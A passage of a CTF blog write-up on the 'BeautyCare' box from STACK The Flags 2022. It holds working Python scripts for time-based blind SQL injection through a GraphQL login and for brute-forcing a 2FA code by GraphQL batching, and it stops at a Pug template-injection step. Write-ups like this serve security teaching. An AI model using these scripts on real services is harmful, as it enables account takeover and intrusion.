@@ -1,0 +1,743 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>STACK The Flags 2022 Open – Fullpwn · ElleuchX1</title><meta name="description" content="Fullpwn Solutions from STACK The Flags CTF"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="STACK The Flags 2022 Open – Fullpwn · ElleuchX1"><meta property="og:description" content="Fullpwn Solutions from STACK The Flags CTF"><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/posts/Fullpwn-STF/"><meta property="og:image" content="https://elleu.ch/og/Fullpwn-STF.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/Fullpwn-STF.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/" aria-current="page">Posts</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/posts/">← Posts</a> <header class="article-head"> <h1 data-pagefind-meta="title">STACK The Flags 2022 Open – Fullpwn</h1> <div class="article-meta"> <time datetime="2022-12-05T00:00:00.000Z">2022-12-05</time> <span>21 min read</span> </div> <div class="article-tags"> <a href="/tags/ctf/">#CTF</a><a href="/tags/boot2root/">#boot2root</a><a href="/tags/stack-the-flags-2022/">#STACK The Flags 2022</a><a href="/tags/hackthebox/">#HackTheBox</a> </div> </header> <details class="toc" open data-pagefind-ignore> <summary>contents</summary> <ul> <li class="d2"><a href="#beautycare-fullpwn-2000-points">BeautyCare (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration">Enumeration</a></li><li class="d3"><a href="#exploitation">Exploitation</a></li><li class="d3"><a href="#privilege-escalation">Privilege Escalation</a></li><li class="d2"><a href="#electrogrid-fullpwn-2000-points">Electrogrid (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration-1">Enumeration</a></li><li class="d3"><a href="#bonus-part---running-gui-app">BONUS PART - Running GUI app</a></li><li class="d3"><a href="#exploitation-1">Exploitation</a></li><li class="d3"><a href="#privilege-escalation-1">Privilege Escalation</a></li><li class="d2"><a href="#lookout-fullpwn-2000-points">Lookout (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration-2">Enumeration</a></li><li class="d3"><a href="#exploitation-2">Exploitation</a></li><li class="d3"><a href="#privilege-escalation-2">Privilege Escalation</a></li> </ul> </details> <div class="prose">  <h2 id="beautycare-fullpwn-2000-points">BeautyCare (Fullpwn, 2000 Points)</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>We started with a simple <code>nmap</code> scan with the basic options:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:~</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -v</span><span style="color:#79B8FF"> 10.129.228.37</span></span>
+<span class="line"><span style="color:#B392F0">22/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  ssh</span><span style="color:#9ECBFF">     OpenSSH</span><span style="color:#9ECBFF"> 8.2p1</span><span style="color:#9ECBFF"> Ubuntu</span><span style="color:#9ECBFF"> 4ubuntu0.5</span><span style="color:#E1E4E8"> (Ubuntu </span><span style="color:#9ECBFF">Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">protocol</span><span style="color:#79B8FF"> 2.0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">80/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  http</span><span style="color:#9ECBFF">    nginx</span><span style="color:#79B8FF"> 1.18.0</span><span style="color:#E1E4E8"> (Ubuntu)</span></span></code></pre>
+<p>The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.</p>
+<p>Checking the Webserver running on port 80. We saw nothing interesting, pretty much everything is static and there is no leakage of a subdoamin/domain in the sources.</p>
+<p><img src="/assets/img/stack-the-flags-2022/beautycare-webpage.webp" alt="beautycare webpage"></p>
+<p>Since there is no domain until now, we can proceed to fuzz for hidden directories with gobuster.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:~</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/big.txt</span><span style="color:#79B8FF">  -u</span><span style="color:#9ECBFF"> http://10.129.228.37</span></span>
+<span class="line"><span style="color:#9ECBFF">===============================================================</span></span>
+<span class="line"><span style="color:#B392F0">Gobuster</span><span style="color:#9ECBFF"> v3.2.0-dev</span></span>
+<span class="line"><span style="color:#B392F0">by</span><span style="color:#9ECBFF"> OJ</span><span style="color:#9ECBFF"> Reeves</span><span style="color:#E1E4E8"> (@TheColonial) &#x26; </span><span style="color:#B392F0">Christian</span><span style="color:#9ECBFF"> Mehlmauer</span><span style="color:#E1E4E8"> (@firefart)</span></span>
+<span class="line"><span style="color:#9ECBFF">===============================================================</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Url:                     http://10.129.228.37</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Method:                  GET</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Threads:                 10</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Negative Status codes:   404</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] User Agent:              gobuster/3.2.0-dev</span></span>
+<span class="line"><span style="color:#E1E4E8">[+] Timeout:                 10s</span></span>
+<span class="line"><span style="color:#9ECBFF">===============================================================</span></span>
+<span class="line"><span style="color:#B392F0">2022/12/05</span><span style="color:#9ECBFF"> 02:50:25</span><span style="color:#9ECBFF"> Starting</span><span style="color:#9ECBFF"> gobuster</span><span style="color:#9ECBFF"> in</span><span style="color:#9ECBFF"> directory</span><span style="color:#9ECBFF"> enumeration</span><span style="color:#9ECBFF"> mode</span></span>
+<span class="line"><span style="color:#9ECBFF">===============================================================</span></span>
+<span class="line"><span style="color:#B392F0">/admin</span><span style="color:#E1E4E8">                (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 863]</span></span></code></pre>
+<p>And we discovered that there is a hidden <code>/admin</code> endpoint which is a simple admin login page.</p>
+<p><img src="/assets/img/stack-the-flags-2022/admin-login.webp" alt="Admin Login"></p>
+<p>I tried to login with some dummy/default credentials. But that didn’t help.</p>
+<p>Checking Burp HTTP history for the requests:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="graphql"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D"> "query"</span><span style="color:#E1E4E8">:{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">    LoginUser</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">username</span><span style="color:#E1E4E8">: \</span><span style="color:#6A737D">"admin\"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">password</span><span style="color:#E1E4E8"> : \</span><span style="color:#6A737D">"admin\"</span><span style="color:#E1E4E8">}{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">     message</span><span style="color:#E1E4E8">,\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">   token</span><span style="color:#E1E4E8"> \</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}\</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}</span><span style="color:#6A737D">"</span></span>
+<span class="line"><span style="color:#6A737D">}</span></span></code></pre>
+<p><a href="https://graphql.org/">GraphQL</a> is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a <code>LoginUser</code> function with the provided username and password. The function is expected to return a message and a token if the login is successful.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="graphql"><code><span class="line"><span style="color:#F97583">mutation</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#FFAB70">    LoginUser</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">username</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">password</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">){</span></span>
+<span class="line"><span style="color:#FFAB70">        message</span></span>
+<span class="line"><span style="color:#FFAB70">        token</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>The first thing I tried was introspection, which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn’t lead to anything.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Then, I’ve tried to add bad characters in the username field. Adding a single quote results in an interesting error:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="graphql"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D"> "query"</span><span style="color:#E1E4E8">:{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">    LoginUser</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">username</span><span style="color:#E1E4E8">: \</span><span style="color:#6A737D">"admin'\"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">password</span><span style="color:#E1E4E8"> : \</span><span style="color:#6A737D">"admin\"</span><span style="color:#E1E4E8">}{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">     message</span><span style="color:#E1E4E8">,\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">   token</span><span style="color:#E1E4E8"> \</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}\</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}</span><span style="color:#6A737D">"</span></span>
+<span class="line"><span style="color:#6A737D">}</span></span></code></pre>
+<p>It seems like the username field is vulnerable to an SQL injection. Since GraphQL is somehow interacting with the SQL database, We’ll not be able to bypass the login with it.</p>
+<p><img src="/assets/img/stack-the-flags-2022/trying-sqli-query.webp" alt="Trying Sqli Query"></p>
+<p>For the sake of this part, I’ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server. If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the <code>res</code> string.In this case, I just guessed the table name and columns and I got a delay.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> time</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line"><span style="color:#6A737D">#printable="a0123456789bcdefghijklmnopqrstuvwxyz"</span></span>
+<span class="line"><span style="color:#E1E4E8">printable</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span>
+<span class="line"><span style="color:#E1E4E8">res</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span></span>
+<span class="line"><span style="color:#F97583">while</span><span style="color:#79B8FF"> True</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> char </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> printable:</span></span>
+<span class="line"><span style="color:#E1E4E8">        time.sleep(</span><span style="color:#79B8FF">0.6</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        session </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.session()</span></span>
+<span class="line"><span style="color:#E1E4E8">        burp0_url </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "http://10.129.255.194:80/graphql"</span></span>
+<span class="line"><span style="color:#E1E4E8">        burp0_headers </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"User-Agent"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Content-Type"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"application/json"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"*/*"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Origin"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"http://10.129.255.194"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Referer"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"http://10.129.255.194/admin"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept-Encoding"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"gzip, deflate"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept-Language"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"en-US,en;q=0.9"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Connection"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"close"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#E1E4E8">        burp0_json</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">"query"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"mutation {</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">    LoginUser(username: </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">-12' or (select sleep(2) from dual where (SELECT username from users ) like '"</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">res</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">char</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">"%')-- </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">, password: </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">a</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">){</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">        message,</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">        token    </span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">}</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#6A737D">        #print(burp0_json)</span></span>
+<span class="line"><span style="color:#E1E4E8">        start </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> time.perf_counter()</span></span>
+<span class="line"><span style="color:#E1E4E8">        session.post(burp0_url, </span><span style="color:#FFAB70">headers</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">burp0_headers, </span><span style="color:#FFAB70">json</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">burp0_json)</span></span>
+<span class="line"><span style="color:#E1E4E8">        request_time </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> time.perf_counter() </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> start</span></span>
+<span class="line"><span style="color:#6A737D">        #print("[Char: ]"+char+" "+str(request_time))</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> request_time </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">            res</span><span style="color:#F97583">+=</span><span style="color:#E1E4E8">char</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"result: "</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">res)</span></span>
+<span class="line"><span style="color:#F97583">            break</span></span></code></pre>
+<p>We run the script and we’re able to retrieve the username!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> python3</span><span style="color:#9ECBFF"> sql.py</span></span>
+<span class="line"><span style="color:#B392F0">result:</span><span style="color:#9ECBFF"> J</span></span>
+<span class="line"><span style="color:#B392F0">result:</span><span style="color:#9ECBFF"> Jo</span></span>
+<span class="line"><span style="color:#B392F0">result:</span><span style="color:#9ECBFF"> Joh</span></span>
+<span class="line"><span style="color:#B392F0">result:</span><span style="color:#9ECBFF"> John</span></span></code></pre>
+<p>Just for the sake of the length of the writeup, we can use similar script to retrieve the MD5 of John user and crack it with <a href="https://crackstation.net/">Crackstation</a> to get <code>iamcool</code>.</p>
+<p>Logging in with user <code>John:iamcool</code> Works and we’re greeted with 2FA.</p>
+<p><img src="/assets/img/stack-the-flags-2022/otp-web.webp" alt="A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes"></p>
+<p>I tried to provide a random OTP to check the request and it’s a graphql query as well:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="graphql"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D"> "query"</span><span style="color:#E1E4E8">:{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">    verify2FA</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">otp</span><span style="color:#E1E4E8">: \</span><span style="color:#6A737D">"1234\"</span><span style="color:#E1E4E8">}{\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">     message</span><span style="color:#E1E4E8">,\</span><span style="color:#FFAB70">n</span><span style="color:#FFAB70">   token</span><span style="color:#E1E4E8"> \</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}\</span><span style="color:#FFAB70">n</span><span style="color:#E1E4E8">}</span><span style="color:#6A737D">"</span></span>
+<span class="line"><span style="color:#6A737D">}</span></span></code></pre>
+<p>This GraphQL mutation queries a <code>verify2FA</code> function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.</p>
+<p>The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.</p>
+<p><img src="/assets/img/stack-the-flags-2022/rate-limit.webp" alt="A screenshot which shows that we’re being rate-limited"></p>
+<p>Since we’re not able to bruteforce it, I tried using GraphQL Batching, which improves performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, we will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.</p>
+<p>We will create a function that generates a GraphQL mutation containing multiple <code>verify2FA</code> queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because we won’t be able to send all the OTP values at once.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> gen_payload</span><span style="color:#E1E4E8">(i):</span></span>
+<span class="line"><span style="color:#E1E4E8">    final</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> token </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%04d</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> %</span><span style="color:#E1E4E8"> I </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> I </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(i,i</span><span style="color:#F97583">+</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">)]:</span></span>
+<span class="line"><span style="color:#E1E4E8">        single </span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">    jaja'</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">token</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">' : verify2FA(otp: </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">token</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">){</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">        message,</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">        token    }</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF"> '</span></span>
+<span class="line"><span style="color:#E1E4E8">        final</span><span style="color:#F97583">+=</span><span style="color:#E1E4E8">single</span></span>
+<span class="line"><span style="color:#E1E4E8">    payload </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'mutation {</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">   '</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">final</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'  </span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">}'</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> payload</span></span></code></pre>
+<p>Then we just keep bruteforcing until we get a hit and get the new token.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests</span></span>
+<span class="line"><span style="color:#F97583">while</span><span style="color:#79B8FF"> True</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    session </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.session()</span></span>
+<span class="line"><span style="color:#E1E4E8">    burp0_url </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "http://10.129.255.194:80/graphql"</span></span>
+<span class="line"><span style="color:#E1E4E8">    burp0_cookies </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"session"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#E1E4E8">    burp0_headers </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"User-Agent"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Content-Type"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"application/json"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"*/*"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Origin"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"http://10.129.255.194"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Referer"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"http://10.129.255.194/admin/otp_verfification"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept-Encoding"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"gzip, deflate"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Accept-Language"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"en-US,en;q=0.9"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Connection"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"close"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#E1E4E8">    burp0_json</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">"query"</span><span style="color:#E1E4E8">: gen_payload(i)}</span></span>
+<span class="line"><span style="color:#E1E4E8">    rar </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> session.post(burp0_url, </span><span style="color:#FFAB70">headers</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">burp0_headers, </span><span style="color:#FFAB70">cookies</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">burp0_cookies, </span><span style="color:#FFAB70">json</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">burp0_json)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(rar.text)</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#9ECBFF">"token"</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> rar.text):</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"hurray: "</span><span style="color:#E1E4E8">,i)</span></span>
+<span class="line"><span style="color:#F97583">        break</span></span>
+<span class="line"><span style="color:#E1E4E8">    i</span><span style="color:#F97583">+=</span><span style="color:#79B8FF">500</span></span></code></pre>
+<p>And we just run the script until we get a hit:</p>
+<p><img src="/assets/img/stack-the-flags-2022/token-got.webp" alt="A screenshot that shows that we got a valid token"></p>
+<p>Now we can use the new token to access the dashboard:</p>
+<p><img src="/assets/img/stack-the-flags-2022/dashboard-admin.webp" alt="A screenshot of the admin dashboard"></p>
+<p>In the <code>/admin/setting</code> endpoint. We have a way to render a template!</p>
+<p><img src="/assets/img/stack-the-flags-2022/admin-ssti-template.webp" alt="A screenshot of the admin templates section"></p>
+<p>So the first thing that comes in mind now is we find an SSTI. Knowing from the <code>Response Headers</code> that we’re dealing with an Express nodejs server. I just tried a bunch of payloads <code>{{7*7}} ${7*7} #{7*7}</code> And the <code>#{7*7}</code> works.</p>
+<p><img src="/assets/img/stack-the-flags-2022/pugssti-template.webp" alt="A screenshot that shows the execution of pug ssti"></p>
+<p>This means that we’re dealing with a <code>pug ssti</code>.  I’ll be using the following payload where I am hosting a bash reverse shell in my local webserver and piping into bash.</p>
